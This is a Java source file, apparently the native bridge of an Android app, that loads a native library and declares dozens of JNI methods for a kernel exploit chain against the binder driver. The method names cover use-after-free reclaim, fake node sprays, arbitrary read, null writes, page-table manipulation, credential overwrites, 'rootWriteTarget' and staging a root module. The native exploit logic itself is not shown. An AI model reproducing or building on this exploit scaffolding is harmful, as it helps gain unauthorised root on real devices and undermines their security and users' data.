package com.vandam.prism;

import android.os.IBinder;
import android.os.Parcel;

final class NativeBridge {
    static final String SHELL_APK_PATH_PROPERTY =
            "com.vandam.prism.shell_apk_path";
    private static final String INSTALLED_APK_PREFIX = "/data/app/";
    private static final String INSTALLED_APK_SUFFIX = "/base.apk";
    private static final String PACKAGE_DIRECTORY_PREFIX =
            "com.vandam.prism-";

    static {
        String apkPath = System.getProperty(SHELL_APK_PATH_PROPERTY);
        if (apkPath != null) {
            System.clearProperty(SHELL_APK_PATH_PROPERTY);
        }
        if (isInstalledBaseApkPath(apkPath)) {
            System.load(apkPath +
                    "!/lib/arm64-v8a/liblp3binderdirect.so");
        } else {
            System.loadLibrary("lp3binderdirect");
        }
    }

    private NativeBridge() {}

    static void ensureLoaded() {}

    private static boolean isInstalledBaseApkPath(String apkPath) {
        if (apkPath == null || !apkPath.startsWith(INSTALLED_APK_PREFIX) ||
                !apkPath.endsWith(INSTALLED_APK_SUFFIX) ||
                apkPath.indexOf('!') >= 0) {
            return false;
        }
        String directories = apkPath.substring(
                INSTALLED_APK_PREFIX.length(),
                apkPath.length() - INSTALLED_APK_SUFFIX.length());
        int separator = directories.indexOf('/');
        String packageDirectory;
        if (separator < 0) {
            packageDirectory = directories;
        } else {
            if (!directories.startsWith("~~") ||
                    separator == 2 ||
                    separator == directories.length() - 1 ||
                    directories.indexOf('/', separator + 1) >= 0) {
                return false;
            }
            packageDirectory = directories.substring(separator + 1);
        }
        return packageDirectory.startsWith(PACKAGE_DIRECTORY_PREFIX) &&
                packageDirectory.length() > PACKAGE_DIRECTORY_PREFIX.length();
    }

    static native long[] ownerTokens(IBinder binder);

    static native String bootstrap(long ownerPointer, long ownerCookie);

    static native String inspectParcel(Parcel parcel);

    static native String inspectRemoteBinderParcel(Parcel parcel);

    static native String exportParcelTemplate(Parcel parcel, String path);

    static native String prepareProbeShellCredential();

    static native String rawBinderRouteProbe(Parcel serviceManagerParcel,
                                              Parcel startServiceParcel,
                                              long callbackPointer,
                                              long callbackCookie,
                                              boolean retainContext);

    static native String releaseRawBinderRouteProbes();

    static native String startRawBinderHolderRoutes(
            String serviceTemplatePath, String startTemplatePath,
            int expectedHolders, int indexSentinel);

    static native String startRawVictimExports(String serviceTemplatePath,
                                                String startTemplatePath,
                                                int expectedVictims);

    static native long[] collectRawVictimExports(int expectedVictims);

    static native String queueAndRetireRawVictimContext(int victim);

    static native String releaseRawVictimContexts(int expectedVictims);

    static native String receiveRawBinderHolderRefs(int expectedHolders,
                                                     int fixedRefsPerHolder,
                                                     int expectedProof,
                                                     int deathObjectIndex);

    static native String releaseRawBinderHolderHandles(
            int expectedHandles, int expectedDeaths);

    static native String extendMixedSharedEpitemReclaim(int targetCount);

    static native String cveTransport(long ownerPointer, long ownerCookie);

    static native int pinCurrentThread(int cpu);

    static native String validateCohort(IBinder calibration,
                                        IBinder[] binders, long[] pointers,
                                        long[] cookies, int ownerCpu);

    static native String adoptAndQueueCohort(IBinder[] binders,
                                             long[] pointers,
                                             long[] cookies,
                                             int ownerCpu);

    static native String retireCohort(long selectedPointer,
                                      long selectedCookie);

    static native int pinAllThreads(int cpu);

    static native String preparePtePlan();

    static native String faultPtePlan();

    static native String checkPtePlan();

    static native String cacheOwnerHandle();

    static native String cacheOwnerHandleForDescriptor(String descriptor);

    static native String cacheOwnerHandleForBinder(IBinder binder,
                                                     String descriptor);

    static native boolean armEpitemLeakOwner(String directory);

    static native int createRawTargetBoundarySignal();

    static native boolean closeRawTargetBoundarySignal();

    static native boolean armRawTargetOwner(String directory, String nonce,
                                             String bootId,
                                             long targetStartTime,
                                             boolean terminalCleanup,
                                             int boundarySignalFd);

    static native String cleanupOwnerFragmentBuffers();

    static native String runEpitemFragmentClient();

    static native String runEpitemLeakClient();

    static native String reclaimWithEpitems(String directory);
    static native String prepareMixedEpitemReclaim(String directory);
    static native String beginMixedEpitemReclaim();
    static native String openMixedBinderWindow(int count);
    static native String extendMixedEpitemReclaim(int targetPairCount);
    static native String completeMixedEpitemReclaim();
    static native String discardMixedEpitemReclaim();
    static native String analyseEpitemLeak(String directory);

    static native String decrementNodeBatch(String directory);
    static native String decrementNodeBatchRange(
            String directory, int start, int count, boolean notifyPredrain);

    static native String enableStaleRead(String directory);

    static native String analyseBinderRefLeak(String directory);

    static native String cacheControlledHandle(IBinder binder);

    static native String prepareFakeNodeCheck(IBinder binder,
                                               long pointer, long cookie,
                                               String directory);

    static native String enableControlledFree(String directory);

    static native String verifyFakeNodeMutation();

    static native String adoptRawControlledNode(IBinder binder,
                                                 long pointer, long cookie);

    static native String validateRawCohort(IBinder[] binders,
                                            int expectedCount);

    static native long startIsolatedRetirementProof();

    static native String recordIsolatedProcesses(long generation,
                                                   int[] pids);

    static native String sendRawControlledRefs(IBinder[] controllers);

    static native String proveIsolatedProcessesRetired(long generation,
                                                        int[] pids,
                                                        int dispatched,
                                                        int timeoutMillis);

    static native String proveRawBinderHoldersRetired(long generation,
                                                       int contexts,
                                                       int callbackDeaths);

    static native String acknowledgeControlledFree(long generation,
                                                     int victim);

    static native String queueRawControlled(IBinder binder, String directory);

    static native String queueRawControlledCohort(IBinder binder,
                                                   IBinder[] cohort,
                                                   String directory);

    static native String queueRawControlledMany(IBinder binder, int count,
                                                  String directory);

    static native String prepareRawFakeNodeCheck(IBinder target,
                                                  long pointer, long cookie,
                                                  String directory);

    static native String prepareRawArbitraryRead(IBinder target,
                                                  long pointer, long cookie,
                                                  String directory);

    static native String handoffRawArbitraryRead(int worker);

    static native String prepareRawNullWrite(long target, int victim,
                                              long pointer, long cookie,
                                              String directory);

    static native String prepareRawNullWriteBatch(long[] pointers,
                                                   long[] cookies,
                                                   String directory);

    static native String armRawNullWriteBatchVictim(int victim,
                                                     long pointer,
                                                     long cookie,
                                                     String directory);

    static native String retainRawNullWriteBatchVictim(int victim,
                                                        int worker);

    static native String retainRawNullWriteBatch(int[] workers);

    static native String validateRawWriteGate(long target, int victim);

    static native String skipDirectRealCredWrites();


    static native long rootWriteTarget(int victim);

    static native String completeRawUnlink(int worker, int victim,
                                            long target, int progressFd);

    static native long arbitraryCredentialAddress();

    static native String probeCurrentBinderProc();

    static native boolean configureRawVictims(long[] pointers,
                                               long[] cookies,
                                               int targetPid);

    static native String terminalCtlbufManifest();

    static native String terminalCtlbufRescuePlan(String nonce);

    static native String installCtlbufRescuePlan(
            String plan, java.io.FileDescriptor moduleMemfd,
            int expectedAppPid);

    static native String cacheRawVictimNode(int victim);

    static native String cacheRawVictimNodes();

    static native String cacheCredentialTarget(IBinder binder, int pid,
                                                 int uid, int gid);

    static native String cacheSecurityTarget(IBinder binder, int pid);

    static native String cacheSecurityTargetPid(int pid);

    static native String adoptCredentialTarget();

    static native String adoptSecurityTarget();

    static native String prepareDirectInitTarget();

    static native String prepareDirectSecurityTarget(
            boolean repairCred, boolean quarantineCred,
            boolean terminalCleanup);

    static native String profileCtlbufRescue(
            int moduleMemfd, int vendorFd, int ueventdPid);

    static native String createPrivateShellCredential();

    static native String prepareCommandRootWatchdog(String nonce);

    static native String awaitCredentialNormalisation(String nonce);

    static native void signalCommandRootWatchdogArm();

    static native String commandRootWatchdogIdentity();

    static native String runReSukiAction(
            java.io.FileDescriptor executable,
            java.io.FileDescriptor moduleStaging, int managerUid,
            boolean activate);

    static native String prepareReSukiLoader(
            java.io.FileDescriptor loader);

    static native String stageReSukiModule(
            java.io.FileDescriptor moduleStaging, long kernelBase);

    static native String reSukiStagePlan(String nonce);

    static native String signalCtlbufDonorFreeze(int donorPid);

    static native String signalCtlbufDonorFrozen(int donorPid);

    static native void signalCredentialNormalisation();

    static native String ctlbufRescueStatus();

    static native String ctlbufFinaliseStatus();

    static native String ctlbufDonorResumeStatus();

    static native String acceptCtlbufFinaliseProof(String proof);

    static native String acceptTerminalNormalisationHostGate(String gate);

    static native String recordCredentialTargetDeath(
            int pid, String startTime, String bootId);

    static native String credentialTargetDeathProof();

    static native void exitCredentialHelper();

    static native String validateTerminalNormalisation();

    static native String proveTerminalDonorRetirement();

    static native String profileRootTarget();

    static native String completeTerminalCleanup(String directory);

    static native String signalDeferredExport();

    static native String prepareReplacementDrain();

    static native String releasePoisonedControl();

    static native String releaseReplacementDrain();

    static native String releaseFakeNodeSpray();

    static native long armBinderDeathBarrier(IBinder binder);

    static native String awaitBinderDeathBarrier(
            long handle, int timeoutMilliseconds);

    static native void discardBinderDeathBarrier(long handle);

    static native long armProcessLifetimeGuard(int pid);

    static native boolean isProcessLifetimeGuardAlive(long handle);

    static native void discardProcessLifetimeGuard(long handle);

}
